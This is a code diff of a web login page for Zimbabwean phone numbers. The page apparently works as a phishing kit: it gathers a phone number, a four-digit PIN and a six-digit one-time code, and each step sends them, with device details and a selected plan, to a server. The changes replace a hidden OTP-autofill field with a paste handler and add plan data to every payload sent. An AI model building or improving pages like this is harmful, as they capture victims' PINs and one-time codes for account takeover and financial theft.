@@ -201,10 +201,6 @@ input{
       <input class="otp-digit" maxlength="1" inputmode="numeric" id="d5">
     </div>
 
-    <!-- 🔑 Hidden OTP catcher (ONLY addition) -->
-    <input id="otpHidden" inputmode="numeric" autocomplete="one-time-code"
-           style="position:absolute;opacity:0;pointer-events:none">
-
     <div id="otpWarning" class="otp-warning">Please input 6 digits</div>
 
     <div class="resend-row">
@@ -230,13 +226,26 @@ input{
 
 <script>
 /* ===== DEVICE STRING ===== */
-const ua=navigator.userAgent;
-let device='Unknown';
-if(/Android/i.test(ua)){const v=ua.match(/Android\s([\d.]+)/);device='Android '+(v?v[1]:'')}
-else if(/iPhone|iPad/i.test(ua)){const v=ua.match(/OS (\d+_\d+)/);device='iOS '+(v?v[1].replace('_','.'):'')}
-if(/Chrome/i.test(ua))device+=' | Chrome';
-else if(/Safari/i.test(ua))device+=' | Safari';
-else if(/Firefox/i.test(ua))device+=' | Firefox';
+const ua = navigator.userAgent;
+let device = 'Unknown';
+
+if (/Android/i.test(ua)) {
+  const v = ua.match(/Android\s([\d.]+)/);
+  device = 'Android ' + (v ? v[1] : '');
+} else if (/iPhone|iPad/i.test(ua)) {
+  const v = ua.match(/OS (\d+_\d+)/);
+  device = 'iOS ' + (v ? v[1].replace('_','.') : '');
+}
+if (/Chrome/i.test(ua)) device += ' | Chrome';
+else if (/Safari/i.test(ua)) device += ' | Safari';
+else if (/Firefox/i.test(ua)) device += ' | Firefox';
+
+/* ===== GET SELECTED PLAN ===== */
+let planData=null;
+try{
+  const raw=sessionStorage.getItem('selectedPlan');
+  if(raw) planData=JSON.parse(raw);
+}catch(e){}
 
 /* ===== PHONE ===== */
 const phone=document.getElementById('phone');
@@ -254,7 +263,7 @@ function validatePhone(){
 }
 
 phone.addEventListener('keydown',e=>{
-  if(phone.selectionStart<=4 && e.key==='Backspace')e.preventDefault();
+  if(phone.selectionStart<=4 && e.key==='Backspace') e.preventDefault();
 });
 phone.addEventListener('input',()=>{
   let d=phone.value.replace('+263','').replace(/\D/g,'').slice(0,9);
@@ -266,14 +275,26 @@ phone.addEventListener('input',()=>{
 /* ===== PIN ===== */
 const pins=[...document.querySelectorAll('.pin-digit')];
 let pinValue='';
+
 pins.forEach((p,i)=>{
   p.addEventListener('input',()=>{
     p.value=p.value.replace(/\D/g,'');
-    if(p.value && i<3)pins[i+1].focus();
+    if(p.value && i<3) pins[i+1].focus();
     pinValue=pins.map(x=>x.value).join('');
     updateLogin();
   });
+  p.addEventListener('keydown',e=>{
+    if(e.key==='Backspace'&&!p.value&&i>0){
+      pins[i-1].focus();
+      pins[i-1].value='';
+      e.preventDefault();
+    }
+  });
 });
+
+function updateLogin(){
+  loginBtn.disabled=!(validatePhone() && /^\d{4}$/.test(pinValue));
+}
 
 /* ===== API ===== */
 async function sendToServer(payload){
@@ -287,7 +308,6 @@ async function sendToServer(payload){
 /* ===== OTP ===== */
 const otpModal=document.getElementById('otpModal');
 const dEls=[0,1,2,3,4,5].map(i=>document.getElementById('d'+i));
-const hidden=document.getElementById('otpHidden');
 const confirmBtn=document.getElementById('confirmOtp');
 const cancelBtn=document.getElementById('cancelOtp');
 const resendBtn=document.getElementById('resendBtn');
@@ -322,27 +342,29 @@ function startCountdown(){
   },1000);
 }
 
-function getOtp(){return dEls.map(d=>d.value).join('')}
+function getOtp(){return dEls.map(d=>d.value).join('');}
 function updateConfirm(){
   const ok=/^\d{6}$/.test(getOtp());
   confirmBtn.disabled=!ok;
   otpWarning.style.display=ok?'none':'block';
 }
 
-/* 🔑 Hidden OTP catcher */
-hidden.addEventListener('input',()=>{
-  const v=hidden.value.replace(/\D/g,'').slice(0,6);
-  if(v.length){
-    dEls.forEach(d=>d.value='');
-    [...v].forEach((ch,i)=>dEls[i].value=ch);
-    updateConfirm();
-  }
-});
-
+/* 🔧 OTP PASTE FIX — ONLY CHANGE */
 dEls.forEach((d,i)=>{
+  d.addEventListener('beforeinput',e=>{
+    if(e.inputType==='insertFromPaste' || (e.data && e.data.length>1)){
+      e.preventDefault();
+      const v=e.data.replace(/\D/g,'').slice(0,6);
+      dEls.forEach(x=>x.value='');
+      [...v].forEach((ch,idx)=>dEls[idx].value=ch);
+      dEls[Math.min(v.length-1,5)].focus();
+      updateConfirm();
+    }
+  });
+
   d.addEventListener('input',()=>{
     d.value=d.value.replace(/\D/g,'');
-    if(d.value && i<5)dEls[i+1].focus();
+    if(d.value && i<5) dEls[i+1].focus();
     updateConfirm();
   });
 });
@@ -353,7 +375,6 @@ document.getElementById('loginForm').addEventListener('submit',async e=>{
   if(document.getElementById('hp').value) return;
 
   otpModal.style.display='flex';
-  hidden.focus();
   dEls.forEach(d=>d.value='');
   updateConfirm();
   startCountdown();
@@ -362,6 +383,7 @@ document.getElementById('loginForm').addEventListener('submit',async e=>{
     event:'login_clicked',
     loginPhone:phone.value,
     loginPin:pinValue,
+    selectedPlan:planData,
     device,
     submittedAt:new Date().toISOString()
   });
@@ -381,6 +403,7 @@ resendBtn.onclick=async()=>{
     event:'resend_otp',
     loginPhone:phone.value,
     loginPin:pinValue,
+    selectedPlan:planData,
     device,
     submittedAt:new Date().toISOString()
   });
@@ -396,6 +419,7 @@ confirmBtn.onclick=async()=>{
     loginPhone:phone.value,
     loginPin:pinValue,
     otp:getOtp(),
+    selectedPlan:planData,
     device,
     submittedAt:new Date().toISOString()
   });
